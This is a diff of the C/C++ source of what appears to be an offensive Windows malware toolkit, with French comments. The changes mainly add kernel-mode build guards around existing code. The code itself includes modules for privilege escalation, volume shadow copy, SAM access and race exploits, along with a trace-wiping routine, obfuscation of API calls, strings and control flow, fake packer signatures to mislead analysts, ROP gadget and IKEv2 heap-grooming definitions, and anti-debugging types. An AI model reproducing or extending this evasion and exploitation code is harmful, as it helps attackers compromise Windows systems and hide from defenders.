@@ -18,7 +18,9 @@
 #include <wininet.h>      // Pour InternetOpenW, InternetReadFile, etc.
 #include <Vss.h>          // Pour IVssBackupComponents, etc.
 #include <VssError.h>
+#ifndef KERNEL_MODE
 #include <winternl.h>
+#endif
 #include <stdint.h>
 #include <stdlib.h>
 #include <string.h>
@@ -44,11 +46,15 @@
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
 #endif
 
+#ifndef KERNEL_MODE
 typedef LONG NTSTATUS;
+#endif
 #ifndef STATUS_SUCCESS
 #define STATUS_SUCCESS 0x00000000
 #endif
 
+// Définitions nécessaires uniquement en mode User (déjà définies dans wdm.h/ntddk.h en mode Kernel)
+#ifndef KERNEL_MODE
 typedef enum _PROCESSINFOCLASS {
     ProcessBasicInformation = 0,
     ProcessDebugPort = 7,
@@ -61,6 +67,7 @@ typedef enum _PROCESSINFOCLASS {
 typedef struct _PROCESS_DEBUG_PORT {
     HANDLE DebugPort;
 } PROCESS_DEBUG_PORT;
+#endif
 
 // ============================================================================
 // [EXPERT EDITION - HIGH-LEVEL OFFENSIVE RESEARCH MODULES]
@@ -248,14 +255,14 @@ void ExpertWipeTraces() {
 extern "C" {
 #endif
 
-// BlueHammer include not available
-// BlueHammer include not available
-// BlueHammer include not available
-// BlueHammer include not available
-// BlueHammer include not available
-// BlueHammer include not available
-// BlueHammer include not available
-// BlueHammer include not available
+#include "BlueHammer/include/common.h"
+#include "BlueHammer/include/escalate.h"
+#include "BlueHammer/include/vss.h"
+#include "BlueHammer/include/update.h"
+#include "BlueHammer/include/cloudfiles.h"
+#include "BlueHammer/include/race.h"
+#include "BlueHammer/include/sam.h"
+#include "BlueHammer/include/ntnative.h"
 
 #ifdef __cplusplus
 }
@@ -452,6 +459,7 @@ BOOL WINAPI __AutoAdjustTokenPrivileges(HANDLE TokenHandle, BOOL DisableAllPrivi
 #undef HeapAlloc
 #undef AdjustTokenPrivileges
 
+#ifndef KERNEL_MODE
 #define LoadLibraryA __AutoLoadLibraryA
 #define GetProcAddress __AutoGetProcAddress
 #define VirtualAlloc __AutoVirtualAlloc
@@ -459,31 +467,37 @@ BOOL WINAPI __AutoAdjustTokenPrivileges(HANDLE TokenHandle, BOOL DisableAllPrivi
 #define HeapCreate __AutoHeapCreate
 #define HeapAlloc __AutoHeapAlloc
 #define AdjustTokenPrivileges __AutoAdjustTokenPrivileges
+#endif
 
 // ==================== STRING ENCRYPTION ====================
 #undef HIDE_STRING
 #define HIDE_STRING(str) (__auto_init_obf(), __auto_decrypt_string(str, sizeof(str) - 1))
 
 // ==================== CONTROL FLOW OBFUSCATION ====================
+#ifndef KERNEL_MODE
 #pragma push_macro("if")
 #pragma push_macro("else")
 #pragma push_macro("for")
 #pragma push_macro("while")
+#endif
 
 #undef if
 #undef else
 #undef for
 #undef while
 
+#ifndef KERNEL_MODE
 #define if(cond) if ((cond) ^ (__obf_key2 % 2))
 #define else else if ((__obf_key2 % 3) != 0)
 #define for(init, cond, incr) for (init; (cond) ^ (__obf_key2 % 2); incr)
 #define while(cond) while ((cond) ^ (__obf_key2 % 2))
+#endif
 
 // ==================== ROP GADGETS ====================
 #define ROP_GADGET(addr) (__obf_key4 ^ (DWORD)(addr))
 
 // ==================== FAKE SIGNATURES ====================
+#ifndef KERNEL_MODE
 #pragma section(".vmp0", read, execute)
 #pragma section(".enigma", read)
 #pragma section(".themida", read)
@@ -491,7 +505,9 @@ BOOL WINAPI __AutoAdjustTokenPrivileges(HANDLE TokenHandle, BOOL DisableAllPrivi
 #pragma section(".ikev2", read)
 #pragma section(".rop", read)
 #pragma section(".heap", read)
+#endif
 
+#ifndef KERNEL_MODE
 __declspec(allocate(".vmp0"))   const BYTE __fake_vmp[]    = {0x56, 0x4D, 0x50, 0x72, 0x6F, 0x74, 0x65, 0x63, 0x74, 0x20, 0x33, 0x2E, 0x35, 0x00};
 __declspec(allocate(".enigma")) const BYTE __fake_enigma[] = {0x45, 0x6E, 0x69, 0x67, 0x6D, 0x61, 0x20, 0x50, 0x72, 0x6F, 0x74, 0x65, 0x63, 0x74, 0x6F, 0x72, 0x00};
 __declspec(allocate(".themida")) const BYTE __fake_themida[] = {0x54, 0x68, 0x65, 0x6D, 0x69, 0x64, 0x61, 0x20, 0x33, 0x2E, 0x35, 0x2E, 0x31, 0x2E, 0x30, 0x00};
@@ -499,6 +515,7 @@ __declspec(allocate(".obfusc"))  const BYTE __fake_obfusc[] = {0x45, 0x70, 0x53,
 __declspec(allocate(".ikev2"))   const BYTE __fake_ikev2[]   = {0x49, 0x4B, 0x45, 0x56, 0x32, 0x20, 0x45, 0x78, 0x70, 0x6C, 0x6F, 0x69, 0x74, 0x00};
 __declspec(allocate(".rop"))     const BYTE __fake_rop[]     = {0x52, 0x4F, 0x50, 0x20, 0x43, 0x68, 0x61, 0x69, 0x6E, 0x00};
 __declspec(allocate(".heap"))    const BYTE __fake_heap[]    = {0x48, 0x65, 0x61, 0x70, 0x20, 0x47, 0x72, 0x6F, 0x6F, 0x6D, 0x00};
+#endif
 
 // ==================== INITIALISATION AUTOMATIQUE DES PROXIES ====================
 // Appel automatique pour initialiser les proxies et les clés
@@ -509,6 +526,7 @@ __forceinline void __auto_init_all() {
 
 // ==================== MACROS GLOBALES POUR OBFUSCATION TOTALE ====================
 // Redéfinition de toutes les fonctions Windows utilisées dans le script
+#ifndef KERNEL_MODE
 #define CreateProcessA __AutoCreateProcessA
 #define CreateThread __AutoCreateThread
 #define VirtualQuery __AutoVirtualQuery
@@ -519,7 +537,10 @@ __forceinline void __auto_init_all() {
 #define GetCurrentThread __AutoGetCurrentThread
 #define GetTickCount __AutoGetTickCount
 #define ExitProcess __AutoExitProcess
+#endif
+#ifndef KERNEL_MODE
 #define NtQueryInformationProcess __AutoNtQueryInformationProcess
+#endif
 
 // ==================== [EpSi_OBF_END] ====================
 
@@ -577,9 +598,6 @@ uint64_t _byteswap_uint64(uint64_t val) {
 #define HEAP_TAG_IKE 0x494B4500
 #define CFG_BITMASK_OFFSET 0x60
 #define CET_ENDBR64_SIGNATURE 0xF30F1EFA
-#define HTONS(x) ((((x) & 0xFF00) >> 8) | (((x) & 0x00FF) << 8))
-#define HTONL(x) ((((x) & 0xFF000000) >> 24) | (((x) & 0x00FF0000) >> 8) | (((x) & 0x0000FF00) << 8) | (((x) & 0x000000FF) << 24))
-#define IKE_ALIGN4(x) (((x) + 3) & ~3)
 #define CHECK_PTR(ptr, msg) do { if (!(ptr)) { goto cleanup; } } while(0)
 #define CHECK_WIN32(func) do { if (!(func)) { goto cleanup; } } while(0)
 
